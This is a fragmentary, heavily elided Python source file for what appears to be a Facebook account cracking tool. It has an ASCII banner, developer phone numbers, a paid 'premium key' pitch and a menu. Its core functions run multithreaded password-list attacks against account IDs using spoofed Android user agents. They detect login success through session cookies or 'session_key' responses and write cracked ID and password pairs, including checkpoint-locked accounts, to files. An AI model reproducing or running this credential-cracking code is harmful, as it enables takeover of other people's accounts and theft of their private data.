...
for xd in range(10000):
	...
	aa='Mozilla/5.0 (Linux; Android'	b=random.choice(['7.0','8.1.0','9','10','11','12'])
...
logo=("""
 ...
 ZZZZZZZZZZZZZZZZZZZ          &&&&&&&&&&         NNNNNNNN        NNNNNNNN

Z:::::::::::::::::Z         &::::::::::&        N:::::::N       N::::::N

Z:::::::::::::::::Z        &::::&&&:::::&       N::::::::N      N::::::N

Z:::ZZZZZZZZ:::::Z        &::::&   &::::&       N:::::::::N     N::::::N
...
ZZZZZZZZZZZZZZZZZZZ        &&&&&&&&   &&&&&     NNNNNNNN         NNNNNNN

    

   \033[1;92m NIHAL BHAI DUA KRO ZAMAN KO GF MIL JE SINGLE HA THUMARA BHAI  
    ...
    JIN KE IDS NAHI NIKLTE HEIN UN KA IP BLOCK HOTA HA

     IP SAHI KASE HOGA RAT KO SONE SE PHALE AEROPLANE

     LAGA KE SO JANA SUBHA TAK IP SAHI HO JE GE       

            

╔══════════════════════════════════════╗

║  WELCOME TO ZAMAN & NIHAL COMMAND     

╚══════════════════════════════════════╝                                     

╔══════════════════════════════════════╗

║\033[1;97m[+] DEVOLPER   : \033[1;92mZaman &  Nihal      

║\033[1;97m[+] FACEBOOK   : \033[1;92mZaman &  Nihal         

║\033[1;97m[+] WHATSAPP   : \033[1;92m03135887879          

║\033[1;97m[+] WHATSAPP   : \033[1;92m03263278727          

║\033[1;97m[+] GITHUB     : \033[1;92mZaman &  Nihal              

║\033[1;97m[+] VERTION    : \033[1;92m1.1                                 
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                print(' \033[1;97mPut file example:  /sdcard/ZN.txt  ')
                                ...
                                os.system('xdg-open git clone https://github.com/Hannan-404/FILE')

                        elif xd in ['4','04']:

                                wx=('Dsj9JMWoixk4Qsje0Ng3nA')

                                os.system(f'xdg-open https://chat.whatsapp.com/Fn69MPxmUv0GBf6MtEvL6G');menu()
                        ...
                        tks = ("Hi ZN Sir, I Need To Buy Your Paid ZN PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
...
def pak():
                ...
                with tred(max_workers=30) as ZN:     
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;37m [ZN] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
...
"Mozilla/5.0 (Linux; Android 6.0.1; XT1254 Build/MCG24.251-5-5; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/391.1.0.35.104;]"]
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        ZN=session.cookies.get_dict().keys()
                        ...
                        if "c_user" in ZN:
                                ...
                                print('\r\r\033[1;32m [ZN-OK] %s | %s'%(ids,pas))

                                open('/sdcard/ZN-OK.txt', 'a').write(ids+'|'+pas+'\n')

                                oks.append(ids)

                                break

                        elif 'checkpoint' in ZN:

                                if 'y' in pcp:

                                        print('\r\r\x1b[1;93m [ZN-CP] '+ids+' | '+pas+'\x1b[1;93m')

                                        open('/sdcard/ZN-CP.txt', 'a').write(ids+'|'+pas+'\n')
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m [ZN-OK] '+ids+' | '+pas+'\033[1;97m')
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        break
                                                ...
                                                print('\r\r\033[1;31m [ZN-2F] : '+cid+' | '+ps+ '\033[1;97m')
